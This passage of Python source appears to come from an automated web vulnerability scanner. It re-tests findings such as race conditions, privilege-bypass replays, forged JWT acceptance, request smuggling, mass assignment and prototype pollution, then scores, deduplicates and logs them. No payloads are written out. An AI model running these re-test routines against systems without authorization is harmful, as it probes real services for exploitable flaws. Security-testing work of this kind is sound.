            # VR-38 (3G): the reachability claim must reproduce — a fresh
            # fetch of the same endpoint through the scan's own engine.
            r = self.engine.send(RequestMutation(
                endpoint=Endpoint(url=f.endpoint_url,
                                  method=f.method or "GET"),
                note="m2-vr38"))
            status = getattr(r, "status", 0)
            if f.type == "shadow_api_endpoint":
                ctype = ""
                for k, v in (getattr(r, "headers", None) or {}).items():
                    if k.lower() == "content-type":
                        ctype = v.lower()
                ok38 = status not in (0, 404, 410, 502, 503) and "json" in ctype
                note = (f"fresh fetch -> HTTP {status}, content-type "
                        f"{ctype or '?'} (shadow must stay live+JSON)")
            else:
                dep = any(e.kind == "deprecated_still_live"
                          for e in (f.evidence or []))
                if dep:
                    ok38 = status not in (0, 404, 410)
                    note = (f"fresh fetch -> HTTP {status} (the deprecated "
                            f"version must still respond)")
                else:
                    ok38 = status in (404, 410)
                    note = (f"fresh fetch -> HTTP {status} (the dead "
                            f"declaration must still 404)")
            v = Verification(method="re-test:spec-diff-reachability",
                             passed=ok38, confidence=0.9 if ok38 else 0.15,
                             rounds=2, notes=note)
            f.verification, f.confidence = v, v.confidence
            f.status = FindingStatus.VERIFIED if ok38 else FindingStatus.REJECTED

        elif f.type == "race_condition":
            # VR-37 (3F): a FRESH concurrent burst — the invariant violation
            # must reproduce. With verify_params declared (a second sample
            # for a single-use resource) the fresh burst spends THAT; without
            # it the same params replay and a consumed resource fail-closes.
            import json as _rj
            from .modernsec2 import (RACE_MAX_N as _rmaxn, RACE_DEFAULT_N as _rdn)
            stash = getattr(self.engine, "race_verify", {}) or {}
            slot = stash.get(f.endpoint_url)
            if slot is None:
                v = Verification(method="re-test:race-fresh-burst",
                                 passed=False, confidence=0.15, rounds=2,
                                 notes="no stashed candidate — cannot re-run")
            else:
                from .race.engine import send_concurrent as _rsc
                cand = dict(slot["candidate"])
                vp = cand.get("verify_params")
                params = vp if vp is not None else cand.get("params") or {}
                n = min(int(cand.get("concurrent") or _rdn), _rmaxn)
                method = str(cand.get("method") or "POST").upper()
                req = {"method": method, "url": f.endpoint_url,
                       "headers": {"Content-Type": "application/json"},
                       "body": _rj.dumps(params)}
                results = _rsc([dict(req) for _ in range(n)],
                               max_concurrent=n, timeout=10.0)
                statuses = [r.get("status") or 0 for r in results]
                winners = sum(1 for x in statuses if x in slot["win"])
                ok37 = winners > slot["quota"]
                note = (f"fresh {n}-wide burst: winners {winners} vs quota "
                        f"{slot['quota']} (statuses {statuses})"
                        + ("" if vp is not None
                           else "; no verify_params declared — same-params "
                                "replay, a consumed single-use resource "
                                "fail-closes"))
                v = Verification(method="re-test:race-fresh-burst",
                                 passed=ok37, confidence=0.9 if ok37 else 0.15,
                                 rounds=2, notes=note)
            f.verification, f.confidence = v, v.confidence
            f.status = FindingStatus.VERIFIED if v.passed else FindingStatus.REJECTED

        elif f.type == "bfla":
            # VR-36 (3E): a FRESH replay of the exact endpoint through the
            # SAME stashed lower-privilege session engine — the execution
            # must reproduce.
            stash = getattr(self.engine, "bfla_verify", {}) or {}
            slot = stash.get(f.endpoint_url)
            if slot is None:
                v = Verification(method="re-test:bfla-fresh-replay",
                                 passed=False, confidence=0.15, rounds=2,
                                 notes="no stashed low-privilege session — "
                                       "cannot re-run (fail closed)")
            else:
                r = slot["engine"].send(RequestMutation(
                    endpoint=slot["endpoint"], note="m2-vr36"))
                from .modernsec2 import _ok as _m2ok
                ok36 = _m2ok(r)
                v = Verification(method="re-test:bfla-fresh-replay",
                                 passed=ok36, confidence=0.9 if ok36 else 0.15,
                                 rounds=2,
                                 notes=(f"fresh lower-privilege replay of "
                                        f"{f.method} {f.endpoint_url} -> HTTP "
                                        f"{getattr(r, 'status', 0)}"))
            f.verification, f.confidence = v, v.confidence
            f.status = FindingStatus.VERIFIED if v.passed else FindingStatus.REJECTED

        elif f.type == "jwt_signature_not_enforced":
            # VR-35 (run-9 class): a FRESH corrupted-signature token against a
            # FRESH harvest — the acceptance must reproduce.
            from .modernsec import replay_sig347
            ok35, notes35 = replay_sig347(self.engine, f)
            v = Verification(method="re-test:fresh-corrupt-acceptance",
                             passed=ok35, confidence=0.9 if ok35 else 0.15,
                             rounds=2, notes=notes35)
            f.verification, f.confidence = v, v.confidence
            f.status = FindingStatus.VERIFIED if ok35 else FindingStatus.REJECTED

        elif f.type == "jwt_none_acceptance":
            # VR-30 (axis 13): a fresh none pair against a fresh harvest.
            from .modernsec import replay_none
            ok30, notes30 = replay_none(self.engine, f)
            v = Verification(method="re-test:fresh-none-differential",
                             passed=ok30, confidence=0.9 if ok30 else 0.15,
                             rounds=2, notes=notes30)
            f.verification, f.confidence = v, v.confidence
            f.status = FindingStatus.VERIFIED if ok30 else FindingStatus.REJECTED

        elif f.type == "graphql_batching_enabled":
            # VR-31 (axis 13): a fresh batch of two DIFFERENT read-only shapes.
            from .modernsec import replay_batching
            ok31, notes31 = replay_batching(self.engine, f)
            v = Verification(method="re-test:fresh-batch",
                             passed=ok31, confidence=0.85 if ok31 else 0.15,
                             rounds=1, notes=notes31)
            f.verification, f.confidence = v, v.confidence
            f.status = FindingStatus.VERIFIED if ok31 else FindingStatus.REJECTED

        elif f.type == "http_request_smuggling":
            # VR-32 (axis 13): a fresh raw timing pair on a fresh connection —
            # the quantized class must reproduce (never raw milliseconds).
            from .modernsec import replay_smuggling
            ok32, notes32 = replay_smuggling(self.engine, f)
            v = Verification(method="re-test:fresh-timing-pair",
                             passed=ok32, confidence=0.85 if ok32 else 0.15,
                             rounds=1, notes=notes32)
            f.verification, f.confidence = v, v.confidence
            f.status = FindingStatus.VERIFIED if ok32 else FindingStatus.REJECTED

        elif f.type == "mass_assignment":
            # VR-33 (axis 13): a fresh canary roundtrip with a DIFFERENT value.
            from .modernsec import replay_ma
            ok33, notes33 = replay_ma(self.engine, f)
            v = Verification(method="re-test:fresh-canary-roundtrip",
                             passed=ok33, confidence=0.9 if ok33 else 0.15,
                             rounds=2, notes=notes33)
            f.verification, f.confidence = v, v.confidence
            f.status = FindingStatus.VERIFIED if ok33 else FindingStatus.REJECTED

        elif f.type == "prototype_pollution":
            # VR-34 (axis 13): a fresh prototype canary with a DIFFERENT value.
            from .modernsec import replay_pp
            ok34, notes34 = replay_pp(self.engine, f)
            v = Verification(method="re-test:fresh-prototype-canary",
                             passed=ok34, confidence=0.9 if ok34 else 0.15,
                             rounds=2, notes=notes34)
            f.verification, f.confidence = v, v.confidence
            f.status = FindingStatus.VERIFIED if ok34 else FindingStatus.REJECTED

        elif f.type in ("ssrf", "command_injection"):
            # VF-02 (v4.2.0) fail-closed: blind classes whose ONLY proof channel is
            # out-of-band. Without an OOB callback + armed OAST there is NO response
            # oracle (a 200/latency differential is ambient noise, live-observed) —
            # these are NEVER response-verified. The old code let them fall into
            # the catch-all else and stamped VERIFIED 0.98 with zero proof.
            v = Verification(method="unverified:blind-class-no-oob", passed=False, confidence=0.3, rounds=0,
                             notes=f"{f.type} is a blind class: no oob_callback evidence and no "
                                   "armed OAST channel — no proof exists; recorded as unverified "
                                   "candidate (VERIFIED requires an out-of-band confirmation)")
            f.verification, f.confidence = v, v.confidence
            f.status = FindingStatus.CANDIDATE
        else:
            # VF-01 (v4.2.0): the old catch-all stamped passed=True confidence=0.98
            # for ANY unlisted type — a fail-open default. The default is now
            # FAIL-CLOSED: unknown types are CANDIDATE; VERIFIED requires an
            # explicit branch. Adding a type = a deliberate, reviewable act.
            v = Verification(method="unverified:no-branch", passed=False, confidence=0.3, rounds=0,
                             notes=f"no verification branch for type {f.type!r} — recorded as "
                                   "unverified candidate; add an explicit branch to have this "
                                   "type verified (fail-closed default)")
            f.verification, f.confidence = v, v.confidence
            f.status = FindingStatus.CANDIDATE

        self.bus.emit("VerificationCompleted", finding=f.id, type=f.type,
                      passed=f.verification.passed if f.verification else False,
                      status=f.status.value, confidence=f.confidence)
        return f


# ============================================================ FINDING PIPELINE (Phase 12)
RISK_WEIGHTS = {"sql_injection": 9, "xss_reflected": 7, "xss_dom": 7, "path_traversal": 7, "xxe": 9,
                "command_injection": 9, "ssrf": 7, "cors_misconfig": 6,
                "ssti": 9, "nosql_injection": 9, "csrf": 5, "jwt_security": 5,
                "code_injection": 9,   # V4.3.2 (DVWS): eval/code-execution class via WS messages
                "graphql_field_suggestions": 3,   # V4.3.3 (DVGA): schema vocab leak
                "host_header_injection": 5,
                "idor_bola": 8, "vertical_privilege_escalation": 9,
                "credential_exposure": 8,
                "open_redirect": 4, "http_response_header_injection": 6,
                "missing_security_headers": 2, "server_banner_disclosure": 1,
                "tech_banner_disclosure": 1, "vulnerable_js_dependency": 2,
                # v4.4.0 (axis 13): the modern vulnerability battery
                "jwt_algorithm_confusion": 8, "jwt_none_acceptance": 8,
                "graphql_batching_enabled": 3, "http_request_smuggling": 6,
                "mass_assignment": 8, "prototype_pollution": 8}

class FindingPipeline:
    def __init__(self, bus: EventBus):
        self.bus = bus

    def dedup(self, findings: list[Finding]) -> list[Finding]:
        seen: dict[str, Finding] = {}
        for f in findings:
            fp = f.fingerprint()
            if fp in seen:
                seen[fp].evidence.extend(f.evidence)
                self.bus.emit("FindingDeduplicated", fingerprint=fp, kept=seen[fp].id, dropped=f.id)
            else:
                seen[fp] = f
        return list(seen.values())

    def correlate(self, findings: list[Finding]) -> list[Finding]:
        """Merge duplicate evidence for the SAME injection point (type + full path + param).
        Different endpoints/parameters stay distinct findings — they are distinct root causes."""
        roots: dict[str, Finding] = {}
        for f in sorted(findings, key=lambda x: -RISK_WEIGHTS.get(x.type, 1)):
            key = f"{f.type}|{f.endpoint_url.split('?')[0]}|{f.parameter}"
            if key in roots:
                roots[key].evidence.extend(f.evidence[:2])
            else:
                roots[key] = f
        return list(roots.values())

    def risk(self, f: Finding) -> int:
        """technical severity x confidence x exposure, 0-100."""
        base = RISK_WEIGHTS.get(f.type, 3) * 10
        conf = f.confidence or 0.5
        auth_factor = 1.0
        return min(100, int(base * conf * auth_factor))


# ============================================================ STRATEGY STORE (Phase 19/25/26)
def wilson_lower(successes: int, n: int, z: float = 1.96) -> float:
    """Wilson score lower bound — sample-size-aware (spec 26)."""
    if n == 0: return 0.0
    p = successes / n
    denom = 1 + z * z / n
    centre = p + z * z / (2 * n)
    margin = z * math.sqrt((p * (1 - p) + z * z / (4 * n)) / n)
    return max(0.0, (centre - margin) / denom)


class StrategyStore:
    """Learning = deterministic statistics from VERIFIED outcomes only (spec 51)."""
    def __init__(self, path: str | None = None):
        self.path = path
        self.stats: dict[str, dict] = {}
        if path and os.path.exists(path):
            self.stats = json.load(open(path))

    def key(self, scanner: str, strategy: str, context: str = "default") -> str:
        return f"{scanner}:{context}:{strategy}"

    def record(self, scanner: str, strategy: str, verified: bool, context: str = "default"):
        k = self.key(scanner, strategy, context)
        s = self.stats.setdefault(k, {"n": 0, "verified": 0, "failed": 0})
        s["n"] += 1
        s["verified" if verified else "failed"] += 1
        self.flush()

    def order(self, scanner: str, strategies: list[str], context: str = "default") -> list[str]:
        """Deterministic ordering by Wilson lower bound; ties broken alphabetically."""
        def lb(st):
            s = self.stats.get(self.key(scanner, st, context), {"n": 0, "verified": 0})
            return (wilson_lower(s["verified"], s["n"]), s["n"])
        return sorted(strategies, key=lambda st: (-lb(st)[0], st))

    def flush(self):
        if self.path:
            json.dump(self.stats, open(self.path, "w"), indent=1)


# ============================================================ FAILURE MEMORY + REPAIR (Phase 18/22)
class FailureMemory:
    """Every failure becomes a permanent record (spec 27) + auto regression case (spec 28)."""
    def __init__(self, path: str | None = None):
        self.path, self.records = path, []
        if path and os.path.exists(path):
            self.records = json.load(open(path))

    def record(self, scanner: str, error: str, context: dict) -> str:
        fid = "fail-" + hashlib.sha1(f"{scanner}{error}{time.time()}".encode()).hexdigest()[:10]
        self.records.append({"id": fid, "scanner": scanner, "error": error[:300],
                             "context": context, "t": time.time()})
        self.flush()
        return fid

    def flush(self):
        if self.path:
            json.dump(self.records, open(self.path, "w"), indent=1)


class RepairClassifier:
    """Deterministic failure -> repair rule mapping (spec 22)."""
    RULES = {
        "timeout_spike": {
            "match": lambda err, ctx: "timeout" in err.lower(),
            "action": {"multiply_timeout": 3.0, "retry": 1},
            "validation": {"benchmark": "local-fixture-v1", "regression": "all"},
        },
        "connection_reset": {
            "match": lambda err, ctx: "ConnectionReset" in err or "RemoteDisconnected" in err,
            "action": {"retry": 2, "backoff_ms": 400},
            "validation": {"benchmark": "local-fixture-v1", "regression": "all"},
        },
        "dns_failure": {
            "match": lambda err, ctx: "gaierror" in err or "Name or service" in err,
            "action": {"skip_endpoint": True, "quarantine_scanner": False},
            "validation": {"regression": "all"},
        },
    }

    def classify(self, error: str, ctx: dict) -> tuple[str, dict] | None:
        for name, rule in self.RULES.items():
            try:
                if rule["match"](error, ctx):
                    return name, rule
            except Exception:
                continue
        return None


class RepairGate:
    """spec 23/38: repair candidates are applied in an isolated copy, tested, benchmarked,
    compared, then accepted or rolled back. Never direct self-modification."""
    def __init__(self, bench_fn, regression_fn):
        self.bench_fn, self.regression_fn = bench_fn, regression_fn

    def attempt(self, failure_id: str, rule_name: str, action: dict, apply_fn, label: str = "") -> dict:
        result = {"failure_id": failure_id, "rule": rule_name, "label": label,
                  "steps": [], "accepted": False}
        for step, fn, ok_check in [
            ("apply_in_isolation", apply_fn, lambda r: r is True),
            ("regression_suite", self.regression_fn, lambda r: r.get("passed") is True),
            ("benchmark_compare", self.bench_fn, lambda r: r.get("acceptable") is True),
        ]:
            try:
                r = fn()
                ok = ok_check(r)
            except Exception as e:
                r, ok = {"error": str(e)}, False
            result["steps"].append({"step": step, "ok": ok, "detail": r if isinstance(r, dict) else r})
            if not ok:
                result["accepted"] = False
                result["rollback_reason"] = f"gate failed at: {step}"
                return result
        result["accepted"] = True
        return result
